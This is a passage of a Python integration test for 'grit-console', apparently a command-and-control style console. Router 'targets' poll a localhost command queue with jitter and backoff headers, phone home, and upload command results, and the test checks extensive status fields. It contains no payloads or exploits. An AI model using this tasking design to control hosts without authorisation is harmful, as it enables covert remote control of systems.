                ((offline_status.get("target_mailbox_records_by_pending_reason") or {}).get("target-poll-overdue") or [{}])[0].get("target_id") != "target-bravo" or
                ((offline_status.get("target_phone_home_records_by_queued_remaining_count") or {}).get("2") or [{}])[0].get("anonymous") is not True or
                offline_status.get("summary", {}).get("target_connectivity_state_counts", {}).get("offline") != 1 or
                offline_status.get("summary", {}).get("target_poll_overdue_count") != 1 or
                offline_status.get("summary", {}).get("target_poll_overdue_counts", {}).get("True") != 1 or
                offline_status.get("summary", {}).get("target_mailbox_target_poll_overdue_counts", {}).get("True") != 1 or
                offline_status.get("summary", {}).get("target_mailbox_target_offline_age_bucket_counts", {}).get("day-plus") != 1 or
                offline_status.get("summary", {}).get("target_mailbox_pending_work_count") != 2 or
                ((offline_status.get("targets_by_poll_overdue") or {}).get("yes") or [{}])[0].get("target_id") != "target-bravo" or
                ((offline_status.get("target_mailbox_records_by_target_poll_overdue") or {}).get("True") or [{}])[0].get("target_id") != "target-bravo" or
                ((offline_status.get("target_mailbox_records_by_target_offline_age_bucket") or {}).get("day-plus") or [{}])[0].get("target_id") != "target-bravo" or
                ((offline_status.get("targets_by_mailbox_pending_work") or {}).get("yes") or [{}])[0].get("target_id") not in {"target-alpha", "target-bravo"}):
            print("offline mailbox status did not preserve queued work and stale heartbeat", file=sys.stderr)
            print(json.dumps(offline_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        poll_target_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(poll_target_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        poll_request = (
            b"GET /command-queue/poll HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"X-Grit-Target-Id: target-alpha\r\n"
            b"X-Grit-Target-Label: Alpha Router\r\n"
            b"X-Grit-Command-Queue-Mode: poll\r\n"
            b"X-Grit-Command-Queue-Poll-Interval-Sec: 11\r\n"
            b"X-Grit-Command-Queue-Poll-Jitter-Pct: 4\r\n"
            b"X-Grit-Command-Queue-Poll-Backoff: exponential\r\n"
            b"X-Grit-Command-Queue-Poll-Max-Interval-Sec: 44\r\n"
            b"X-Grit-Command-Queue-Max-Polls: 9\r\n"
            b"Connection: close\r\n\r\n"
        )
        poll_response = connect_with_retry(poll_target_port, poll_request)
        poll_stdout, poll_stderr = poll_target_server.communicate(timeout=15)
        if (poll_target_server.returncode != 0 or
                b"HTTP/1.1 200 OK" not in poll_response or
                alpha_id.encode("ascii") not in poll_response or
                bravo_id.encode("ascii") in poll_response):
            print("target-scoped command queue poll did not deliver the selected target command only", file=sys.stderr)
            print(poll_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(poll_stdout, file=sys.stderr)
            print(poll_stderr, file=sys.stderr)
            return 1
        poll_after = json.loads(poll_target_queue_file.read_text(encoding="utf-8"))
        alpha_command = next(rec for rec in poll_after["commands"] if rec.get("id") == alpha_id)
        bravo_command = next(rec for rec in poll_after["commands"] if rec.get("id") == bravo_id)
        if (alpha_command.get("status") != "delivered" or
                alpha_command.get("target_id") != "target-alpha" or
                bravo_command.get("status") != "queued"):
            print("target-scoped command queue poll mutated the wrong records", file=sys.stderr)
            print(json.dumps(poll_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        target_result = json.dumps({
            "schema": 1,
            "command_id": alpha_id,
            "status": "completed",
            "exit_code": 0,
            "stdout_bytes": 1,
            "stderr_bytes": 0,
        }).encode("utf-8")
        poll_target_status = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--target-id", "target-alpha",
            "--json-status",
        ).stdout)
        target_alpha_status = (poll_target_status.get("targets_by_id") or {}).get("target-alpha", {})
        target_alpha_mailbox = (poll_target_status.get("target_mailbox_records_by_command_id") or {}).get(alpha_id) or {}
        if (poll_target_status.get("summary", {}).get("command_queue_target_counts", {}).get("target-alpha") != 1 or
                poll_target_status.get("summary", {}).get("target_count") != 1 or
                poll_target_status.get("summary", {}).get("target_latest_activity_service_counts", {}).get("command-queue") != 1 or
                poll_target_status.get("summary", {}).get("target_latest_activity_operation_counts", {}).get("command_queue_poll") != 1 or
                poll_target_status.get("summary", {}).get("target_connectivity_state_counts", {}).get("online") != 1 or
                poll_target_status.get("summary", {}).get("target_last_seen_via_counts", {}).get("command-queue:command_queue_poll") != 1 or
                poll_target_status.get("summary", {}).get("target_offline_age_bucket_counts", {}).get("under-minute") != 1 or
                poll_target_status.get("summary", {}).get("target_next_expected_poll_count") != 1 or
                poll_target_status.get("summary", {}).get("target_mailbox_pending_work_count") != 0 or
                target_alpha_status.get("services_seen") != ["command-queue"] or
                target_alpha_status.get("latest_activity_service") != "command-queue" or
                target_alpha_status.get("latest_activity_operation") != "command_queue_poll" or
                target_alpha_status.get("last_seen") != target_alpha_status.get("last_seen_at") or
                target_alpha_status.get("last_seen_via") != "command-queue:command_queue_poll" or
                target_alpha_status.get("connectivity_state") != "online" or
                target_alpha_status.get("offline_age_bucket") != "under-minute" or
                not isinstance(target_alpha_status.get("offline_for_sec"), int) or
                not target_alpha_status.get("next_expected_poll") or
                target_alpha_status.get("mailbox_queued_command_count") != 0 or
                target_alpha_status.get("mailbox_delivered_command_count") != 1 or
                target_alpha_status.get("mailbox_pending_work_count") != 0 or
                target_alpha_status.get("latest_command_queue_poll_interval_sec") != "11" or
                target_alpha_mailbox.get("waiting_for") != "result-upload" or
                target_alpha_mailbox.get("pending_reason") != "awaiting-result-upload" or
                target_alpha_mailbox.get("delivered_without_result") is not True or
                not isinstance(target_alpha_mailbox.get("delivered_without_result_for_sec"), int) or
                poll_target_status.get("summary", {}).get("target_phone_home_queued_remaining_count_counts", {}).get("1") != 1 or
                poll_target_status.get("summary", {}).get("target_phone_home_pending_work_remaining_counts", {}).get("True") != 1 or
                poll_target_status.get("summary", {}).get("target_phone_home_target_connectivity_state_counts", {}).get("online") != 1 or
                poll_target_status.get("summary", {}).get("target_phone_home_target_offline_age_bucket_counts", {}).get("under-minute") != 1 or
                poll_target_status.get("summary", {}).get("target_phone_home_target_mailbox_pending_work_count_counts", {}).get("0") != 1 or
                poll_target_status.get("summary", {}).get("target_mailbox_waiting_for_counts", {}).get("result-upload") != 1 or
                poll_target_status.get("summary", {}).get("target_mailbox_pending_reason_counts", {}).get("awaiting-result-upload") != 1 or
                ((poll_target_status.get("target_mailbox_records_by_waiting_for") or {}).get("result-upload") or [{}])[0].get("command_id") != alpha_id or
                ((poll_target_status.get("target_mailbox_records_by_pending_reason") or {}).get("awaiting-result-upload") or [{}])[0].get("command_id") != alpha_id or
                ((poll_target_status.get("target_phone_home_records_by_queued_remaining_count") or {}).get("1") or [{}])[0].get("command_id") != alpha_id or
                ((poll_target_status.get("target_phone_home_records_by_target_offline_age_bucket") or {}).get("under-minute") or [{}])[0].get("command_id") != alpha_id or
                ((poll_target_status.get("target_phone_home_records_by_target_mailbox_pending_work_count") or {}).get("0") or [{}])[0].get("command_id") != alpha_id or
                ((poll_target_status.get("targets_by_latest_activity_service") or {}).get("command-queue") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_latest_activity_operation") or {}).get("command_queue_poll") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_connectivity_state") or {}).get("online") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_last_seen_via") or {}).get("command-queue:command_queue_poll") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_offline_age_bucket") or {}).get("under-minute") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_has_next_expected_poll") or {}).get("yes") or [{}])[0].get("target_id") != "target-alpha" or
                ((poll_target_status.get("targets_by_mailbox_pending_work") or {}).get("no") or [{}])[0].get("target_id") != "target-alpha" or
                not any((event.get("details") or {}).get("target_id") == "target-alpha" and event.get("event") == "command_queue_poll_delivered" for event in poll_target_status.get("events") or []) or
                poll_target_status.get("summary", {}).get("event_detail_poll_mode_counts", {}).get("poll", 0) < 1 or
                poll_target_status.get("summary", {}).get("event_detail_poll_interval_sec_counts", {}).get("11", 0) < 1 or
                poll_target_status.get("summary", {}).get("event_detail_poll_jitter_pct_counts", {}).get("4", 0) < 1 or
                poll_target_status.get("summary", {}).get("event_detail_poll_backoff_counts", {}).get("exponential", 0) < 1 or
                poll_target_status.get("summary", {}).get("event_detail_poll_max_interval_sec_counts", {}).get("44", 0) < 1 or
                poll_target_status.get("summary", {}).get("event_detail_max_polls_counts", {}).get("9", 0) < 1 or
                (poll_target_status.get("event_log_stats") or {}).get("by_detail_poll_backoff", {}).get("exponential", 0) < 1 or
                ((poll_target_status.get("events_by_detail_poll_interval_sec") or {}).get("11") or [{}])[0].get("details", {}).get("poll_backoff") != "exponential" or
                "events_by_detail_poll_interval_sec" not in (((poll_target_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "targets_by_connectivity_state" not in (((poll_target_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "targets_by_offline_age_bucket" not in (((poll_target_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "target_mailbox_records_by_waiting_for" not in (((poll_target_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "target_mailbox_records_by_pending_reason" not in (((poll_target_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "target_phone_home_records_by_queued_remaining_count" not in (((poll_target_status.get("api_collections") or {}).get("target_phone_home_records") or {}).get("indexes") or []) or
                "target_phone_home_records_by_target_offline_age_bucket" not in (((poll_target_status.get("api_collections") or {}).get("target_phone_home_records") or {}).get("indexes") or []) or
                "target_phone_home_records_by_target_mailbox_pending_work_count" not in (((poll_target_status.get("api_collections") or {}).get("target_phone_home_records") or {}).get("indexes") or [])):
            print("target-scoped command queue poll missing from filtered status", file=sys.stderr)
            print(json.dumps(poll_target_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        result_without_target_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(poll_target_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        result_without_target_response = connect_with_retry(poll_target_port, (
            b"POST /command-queue/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(target_result)).encode("ascii") + b"\r\n"
            b"Connection: close\r\n\r\n" + target_result
        ))
        result_without_target_stdout, result_without_target_stderr = result_without_target_server.communicate(timeout=15)
        if (result_without_target_server.returncode != 0 or
                b"HTTP/1.1 400 Bad Request" not in result_without_target_response or
                b"command result target id required" not in result_without_target_response):
            print("target-scoped command result without target id was not rejected", file=sys.stderr)
            print(result_without_target_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(result_without_target_stdout, file=sys.stderr)
            print(result_without_target_stderr, file=sys.stderr)
            return 1
        result_wrong_target_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(poll_target_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        result_wrong_target_response = connect_with_retry(poll_target_port, (
            b"POST /command-queue/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"X-Grit-Target-Id: target-bravo\r\n"
            b"Content-Length: " + str(len(target_result)).encode("ascii") + b"\r\n"
            b"Connection: close\r\n\r\n" + target_result
        ))
        result_wrong_target_stdout, result_wrong_target_stderr = result_wrong_target_server.communicate(timeout=15)
        if (result_wrong_target_server.returncode != 0 or
                b"HTTP/1.1 400 Bad Request" not in result_wrong_target_response or
                b"command result target mismatch" not in result_wrong_target_response):
            print("target-scoped command result wrong target was not rejected", file=sys.stderr)
            print(result_wrong_target_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(result_wrong_target_stdout, file=sys.stderr)
            print(result_wrong_target_stderr, file=sys.stderr)
            return 1
        result_reject_after = json.loads(poll_target_queue_file.read_text(encoding="utf-8"))
        alpha_after_reject = next(rec for rec in result_reject_after["commands"] if rec.get("id") == alpha_id)
        if alpha_after_reject.get("status") != "delivered" or alpha_after_reject.get("result"):
            print("rejected target-scoped command result mutated the command record", file=sys.stderr)
            print(json.dumps(result_reject_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        poll_targets = json.loads(poll_targets_file.read_text(encoding="utf-8"))
        poll_targets["targets"]["target-bravo"].update({
            "last_seen_at": old_seen,
            "latest_activity_at": old_seen,
            "latest_activity_service": "command-queue",
            "latest_activity_operation": "command_queue_poll",
            "latest_command_queue_poll_interval_sec": "11",
            "remote_addresses": ["198.51.100.10:12345"],
            "services_seen": ["command-queue"],
        })
        poll_targets_file.write_text(json.dumps(poll_targets, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        result_alpha_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(poll_target_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        result_alpha_response = connect_with_retry(poll_target_port, (
            b"POST /command-queue/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"X-Grit-Target-Id: target-alpha\r\n"
            b"X-Grit-Target-Label: Alpha Router\r\n"
            b"Content-Length: " + str(len(target_result)).encode("ascii") + b"\r\n"
            b"Connection: close\r\n\r\n" + target_result
        ))
        result_alpha_stdout, result_alpha_stderr = result_alpha_server.communicate(timeout=15)
        if (result_alpha_server.returncode != 0 or
                b"HTTP/1.1 200 OK" not in result_alpha_response or
                b'"status": "result-received"' not in result_alpha_response):
            print("target-scoped command result upload failed after reconnect", file=sys.stderr)
            print(result_alpha_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(result_alpha_stdout, file=sys.stderr)
            print(result_alpha_stderr, file=sys.stderr)
            return 1
        result_status = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--json-status",
        ).stdout)
        result_alpha = (result_status.get("targets_by_id") or {}).get("target-alpha") or {}
        result_bravo = (result_status.get("targets_by_id") or {}).get("target-bravo") or {}
        result_alpha_actions = (result_status.get("target_workflow_actions_by_target_id") or {}).get("target-alpha") or []
        result_bravo_actions = (result_status.get("target_workflow_actions_by_target_id") or {}).get("target-bravo") or []
        result_alpha_actions_by_action = {
            rec.get("action_id"): rec for rec in result_alpha_actions
            if isinstance(rec, dict)
        }
        result_bravo_actions_by_action = {
            rec.get("action_id"): rec for rec in result_bravo_actions
            if isinstance(rec, dict)
        }
        result_alpha_command = ((result_status.get("command_queue") or {}).get("commands_by_result_status") or {}).get("completed", [{}])[0]
        result_alpha_mailbox = (result_status.get("target_mailbox_records_by_command_id") or {}).get(alpha_id) or {}
        result_bravo_mailbox = (result_status.get("target_mailbox_records_by_command_id") or {}).get(bravo_id) or {}
        result_workflows = result_status.get("operator_console_workflows") or []
        result_workflows_by_id = result_status.get("operator_console_workflows_by_id") or {}
        result_mailbox_workflow = result_workflows_by_id.get("mailbox") or {}
        if (result_alpha.get("connectivity_state") != "online" or
                result_alpha.get("last_seen_via") != "command-queue:command_queue_result" or
                result_alpha.get("offline_age_bucket") != "under-minute" or
                result_alpha.get("latest_phone_home_status") != "result-received" or
                result_alpha.get("latest_successful_phone_home_status") != "result-received" or
                result_alpha.get("mailbox_result_received_command_count") != 1 or
                result_alpha.get("mailbox_pending_work_count") != 0 or
                result_alpha.get("latest_command_result_id") != alpha_id or
                not result_alpha.get("latest_command_result_at") or
                result_bravo.get("connectivity_state") != "offline" or
                result_bravo.get("offline_age_bucket") != "day-plus" or
                result_bravo.get("has_last_failed_phone_home") is not True or
                result_bravo.get("failed_phone_home_count") != 1 or
                result_bravo.get("last_failed_phone_home_status") != "rejected" or
                "command result target mismatch" not in result_bravo.get("last_failed_phone_home_reason", "") or
                result_bravo.get("poll_overdue") is not True or
                not isinstance(result_bravo.get("poll_overdue_for_sec"), int) or
                result_bravo.get("mailbox_pending_work_count") != 1 or
                result_status.get("summary", {}).get("target_connectivity_state_counts", {}).get("online") != 1 or
                result_status.get("summary", {}).get("target_connectivity_state_counts", {}).get("offline") != 1 or
                result_status.get("summary", {}).get("target_offline_age_bucket_counts", {}).get("under-minute") != 1 or
                result_status.get("summary", {}).get("target_offline_age_bucket_counts", {}).get("day-plus") != 1 or
                result_status.get("summary", {}).get("target_failed_phone_home_target_count") != 1 or
                result_status.get("summary", {}).get("target_last_failed_phone_home_status_counts", {}).get("rejected") != 1 or
                result_status.get("summary", {}).get("target_has_last_failed_phone_home_counts", {}).get("True") != 1 or
                result_status.get("summary", {}).get("target_poll_overdue_count") != 1 or
                result_status.get("summary", {}).get("target_mailbox_pending_work_count") != 1 or
                result_status.get("summary", {}).get("target_last_seen_via_counts", {}).get("command-queue:command_queue_result") != 1 or
                result_status.get("summary", {}).get("target_mailbox_record_count") != 2 or
                result_status.get("summary", {}).get("target_mailbox_status_counts", {}).get("queued") != 1 or
                result_status.get("summary", {}).get("target_mailbox_status_counts", {}).get("result-received") != 1 or
                result_status.get("summary", {}).get("target_mailbox_waiting_for_counts", {}).get("none") != 1 or
                result_status.get("summary", {}).get("target_mailbox_waiting_for_counts", {}).get("target-poll") != 1 or
                result_status.get("summary", {}).get("target_mailbox_pending_reason_counts", {}).get("target-poll-overdue") != 1 or
                result_status.get("summary", {}).get("target_mailbox_result_status_counts", {}).get("completed") != 1 or
                (result_status.get("api_collections") or {}).get("target_mailbox_records", {}).get("count") != 2 or
                result_alpha_command.get("id") != alpha_id or
                result_alpha_command.get("target_id") != "target-alpha" or
                result_alpha_mailbox.get("target_id") != "target-alpha" or
                result_alpha_mailbox.get("target_label") != "Alpha Router" or
                result_alpha_mailbox.get("status") != "result-received" or
                result_alpha_mailbox.get("result_status") != "completed" or
                result_alpha_mailbox.get("result_exit_code") != 0 or
                result_alpha_mailbox.get("has_result") is not True or
                result_alpha_mailbox.get("pending_work") is not False or
                result_alpha_mailbox.get("waiting_for") != "none" or
                result_alpha_mailbox.get("pending_reason") != "" or
                result_alpha_mailbox.get("has_pending_reason") is not False or
                not isinstance(result_alpha_mailbox.get("age_sec"), int) or
                not isinstance(result_alpha_mailbox.get("result_latency_sec"), int) or
                not result_alpha_mailbox.get("result_received_at") or
                result_alpha_mailbox.get("target_connectivity_state") != "online" or
                result_alpha_mailbox.get("target_last_seen_via") != "command-queue:command_queue_result" or
                result_alpha_mailbox.get("target_offline_age_bucket") != "under-minute" or
                result_alpha_mailbox.get("has_target_next_expected_poll") is not False or
                result_bravo_mailbox.get("target_id") != "target-bravo" or
                result_bravo_mailbox.get("target_label") != "Bravo Router" or
                result_bravo_mailbox.get("status") != "queued" or
                result_bravo_mailbox.get("waiting_for") != "target-poll" or
                result_bravo_mailbox.get("pending_reason") != "target-poll-overdue" or
                result_bravo_mailbox.get("has_pending_reason") is not True or
                result_bravo_mailbox.get("pending_work") is not True or
                result_bravo_mailbox.get("has_result") is not False or
                result_bravo_mailbox.get("target_connectivity_state") != "offline" or
                result_bravo_mailbox.get("target_offline_age_bucket") != "day-plus" or
                result_bravo_mailbox.get("target_last_seen") != old_seen or
                result_bravo_mailbox.get("target_last_seen_via") != "command-queue:command_queue_poll" or
                result_bravo_mailbox.get("has_target_next_expected_poll") is not True or
                result_bravo_mailbox.get("target_poll_overdue") is not True or
                not isinstance(result_bravo_mailbox.get("target_poll_overdue_for_sec"), int) or
                not result_bravo_mailbox.get("target_next_expected_poll") or
                ((result_status.get("target_mailbox_records_by_target_id") or {}).get("target-alpha") or [{}])[0].get("command_id") != alpha_id or
                ((result_status.get("target_mailbox_records_by_target_id") or {}).get("target-bravo") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_target_connectivity_state") or {}).get("offline") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_target_last_seen_via") or {}).get("command-queue:command_queue_poll") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_target_offline_age_bucket") or {}).get("day-plus") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_has_target_next_expected_poll") or {}).get("True") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_pending_work") or {}).get("True") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_waiting_for") or {}).get("none") or [{}])[0].get("command_id") != alpha_id or
                ((result_status.get("target_mailbox_records_by_waiting_for") or {}).get("target-poll") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_pending_reason") or {}).get("target-poll-overdue") or [{}])[0].get("command_id") != bravo_id or
                ((result_status.get("target_mailbox_records_by_has_result") or {}).get("True") or [{}])[0].get("command_id") != alpha_id or
                ((result_status.get("targets_by_mailbox_pending_work") or {}).get("yes") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("targets_by_has_last_failed_phone_home") or {}).get("yes") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("targets_by_last_failed_phone_home_status") or {}).get("rejected") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("targets_by_last_seen_via") or {}).get("command-queue:command_queue_result") or [{}])[0].get("target_id") != "target-alpha" or
                ((result_status.get("targets_by_offline_age_bucket") or {}).get("day-plus") or [{}])[0].get("target_id") != "target-bravo" or
                result_alpha_actions_by_action.get("queue-command", {}).get("target_latest_phone_home_status") != "result-received" or
                result_alpha_actions_by_action.get("queue-command", {}).get("target_latest_successful_phone_home_status") != "result-received" or
                result_alpha_actions_by_action.get("queue-command", {}).get("target_mailbox_pending_work_count") != 0 or
                result_bravo_actions_by_action.get("queue-command", {}).get("target_mailbox_pending_work_count") != 1 or
                result_bravo_actions_by_action.get("queue-command", {}).get("target_poll_overdue") is not True or
                result_bravo_actions_by_action.get("queue-command", {}).get("target_offline_age_bucket") != "day-plus" or
                result_bravo_actions_by_action.get("queue-command", {}).get("target_last_failed_phone_home_status") != "rejected" or
                "command result target mismatch" not in result_bravo_actions_by_action.get("queue-command", {}).get("target_last_failed_phone_home_reason", "") or
                ((result_status.get("target_workflow_actions_by_target_mailbox_pending_work_count") or {}).get("1") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("target_workflow_actions_by_target_offline_age_bucket") or {}).get("day-plus") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("target_workflow_actions_by_target_last_failed_phone_home_status") or {}).get("rejected") or [{}])[0].get("target_id") != "target-bravo" or
                result_status.get("summary", {}).get("target_workflow_action_target_mailbox_pending_work_count_counts", {}).get("1") != len(result_bravo_actions) or
                result_status.get("summary", {}).get("target_workflow_action_target_offline_age_bucket_counts", {}).get("under-minute") != len(result_alpha_actions) or
                result_status.get("summary", {}).get("target_workflow_action_target_offline_age_bucket_counts", {}).get("day-plus") != len(result_bravo_actions) or
                result_status.get("summary", {}).get("target_workflow_action_target_last_failed_phone_home_status_counts", {}).get("rejected") != len(result_bravo_actions) or
                result_status.get("summary", {}).get("target_mailbox_target_connectivity_state_counts", {}).get("offline") != 1 or
                result_status.get("summary", {}).get("target_mailbox_target_offline_age_bucket_counts", {}).get("under-minute") != 1 or
                result_status.get("summary", {}).get("target_mailbox_target_offline_age_bucket_counts", {}).get("day-plus") != 1 or
                result_status.get("summary", {}).get("target_phone_home_target_connectivity_state_counts", {}).get("online") != 2 or
                result_status.get("summary", {}).get("target_phone_home_target_connectivity_state_counts", {}).get("offline") != 1 or
                result_status.get("summary", {}).get("target_phone_home_target_offline_age_bucket_counts", {}).get("under-minute") != 2 or
                result_status.get("summary", {}).get("target_phone_home_target_offline_age_bucket_counts", {}).get("day-plus") != 1 or
                result_mailbox_workflow.get("fleet_target_count") != 2 or
                result_mailbox_workflow.get("fleet_connectivity_state_counts", {}).get("online") != 1 or
                result_mailbox_workflow.get("fleet_connectivity_state_counts", {}).get("offline") != 1 or
                result_mailbox_workflow.get("fleet_mailbox_pending_target_count") != 1 or
                result_mailbox_workflow.get("fleet_mailbox_pending_work_count") != 1 or
                result_mailbox_workflow.get("fleet_poll_overdue_target_count") != 1 or
                result_mailbox_workflow.get("fleet_has_offline_targets") is not True or
                result_mailbox_workflow.get("fleet_has_mailbox_pending_work") is not True or
                result_mailbox_workflow.get("fleet_has_poll_overdue_targets") is not True or
                result_status.get("summary", {}).get("operator_console_workflow_fleet_target_count_counts", {}).get("2") != len(result_workflows) or
                result_status.get("summary", {}).get("operator_console_workflow_fleet_mailbox_pending_work_count_counts", {}).get("1") != len(result_workflows) or
                result_status.get("summary", {}).get("target_mailbox_has_target_next_expected_poll_counts", {}).get("True") != 1 or
                result_status.get("summary", {}).get("target_mailbox_target_poll_overdue_counts", {}).get("True") != 1 or
                not result_status.get("summary", {}).get("target_mailbox_age_bucket_counts") or
                "target_mailbox_records_by_target_connectivity_state" not in (((result_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "target_mailbox_records_by_target_offline_age_bucket" not in (((result_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "targets_by_poll_overdue" not in (((result_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "target_mailbox_records_by_target_poll_overdue" not in (((result_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "target_mailbox_records_by_pending_reason" not in (((result_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "target_mailbox_records_by_result_latency_bucket" not in (((result_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes") or []) or
                "targets_by_offline_age_bucket" not in (((result_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "targets_by_has_last_failed_phone_home" not in (((result_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "targets_by_last_failed_phone_home_status" not in (((result_status.get("api_collections") or {}).get("targets") or {}).get("indexes") or []) or
                "target_workflow_actions_by_target_mailbox_pending_work_count" not in (((result_status.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes") or []) or
                "target_workflow_actions_by_target_offline_age_bucket" not in (((result_status.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes") or []) or
                "target_workflow_actions_by_target_last_failed_phone_home_status" not in (((result_status.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes") or []) or
                "target_phone_home_records_by_target_connectivity_state" not in (((result_status.get("api_collections") or {}).get("target_phone_home_records") or {}).get("indexes") or []) or
                "target_phone_home_records_by_target_offline_age_bucket" not in (((result_status.get("api_collections") or {}).get("target_phone_home_records") or {}).get("indexes") or []) or
                "operator_console_workflows_by_fleet_mailbox_pending_work_count" not in (((result_status.get("api_collections") or {}).get("operator_console_workflows") or {}).get("indexes") or []) or
                "operator_console_workflows_by_fleet_has_poll_overdue_targets" not in (((result_status.get("api_collections") or {}).get("operator_console_workflows") or {}).get("indexes") or []) or
                not any((event.get("details") or {}).get("target_id") == "target-alpha" and event.get("event") == "command_queue_result_upload_received" for event in result_status.get("events") or [])):
            print("target mailbox result upload did not update heartbeat and result status", file=sys.stderr)
            print(json.dumps(result_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        result_alpha_filtered = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--target-id", "target-alpha", "--json-status",
        ).stdout)
        result_bravo_filtered = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--target-id", "target-bravo", "--json-status",
        ).stdout)
        result_alpha_filter = result_alpha_filtered.get("target_filter") or {}
        result_bravo_filter = result_bravo_filtered.get("target_filter") or {}
        if (result_alpha_filter.get("selected_target_latest_phone_home_status") != "result-received" or
                result_alpha_filter.get("selected_target_latest_successful_phone_home_status") != "result-received" or
                result_alpha_filter.get("selected_target_last_failed_phone_home_status") != "" or
                result_alpha_filtered.get("api", {}).get("target_filter_selected_target_latest_successful_phone_home_status") != "result-received" or
                result_bravo_filter.get("selected_target_last_failed_phone_home_status") != "rejected" or
                not result_bravo_filter.get("selected_target_last_failed_phone_home_at") or
                "command result target mismatch" not in result_bravo_filter.get("selected_target_last_failed_phone_home_reason", "") or
                result_bravo_filtered.get("api", {}).get("target_filter_selected_target_last_failed_phone_home_status") != "rejected" or
                "command result target mismatch" not in result_bravo_filtered.get("api", {}).get("target_filter_selected_target_last_failed_phone_home_reason", "") or
                "target_filter_records_by_selected_target_latest_successful_phone_home_status" not in (((result_alpha_filtered.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes") or []) or
                "target_filter_records_by_selected_target_last_failed_phone_home_status" not in (((result_bravo_filtered.get("api_collections") or {}).get("target_filter_records") or {}).get("indexes") or [])):
            print("target-filter JSON missing selected target phone-home state", file=sys.stderr)
            print(json.dumps({
                "alpha_filter": result_alpha_filter,
                "alpha_api": result_alpha_filtered.get("api", {}),
                "bravo_filter": result_bravo_filter,
                "bravo_api": result_bravo_filtered.get("api", {}),
            }, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        result_activity_alpha = (result_status.get("target_activity_records_by_target_id") or {}).get("target-alpha") or []
        result_activity_bravo = (result_status.get("target_activity_records_by_target_id") or {}).get("target-bravo") or []
        result_alpha_activity_categories = {rec.get("category") for rec in result_activity_alpha}
        result_bravo_activity_categories = {rec.get("category") for rec in result_activity_bravo}
        alpha_mailbox_activity = next(
            (rec for rec in result_activity_alpha if rec.get("category") == "mailbox" and rec.get("command_id") == alpha_id),
            {},
        )
        bravo_mailbox_activity = next(
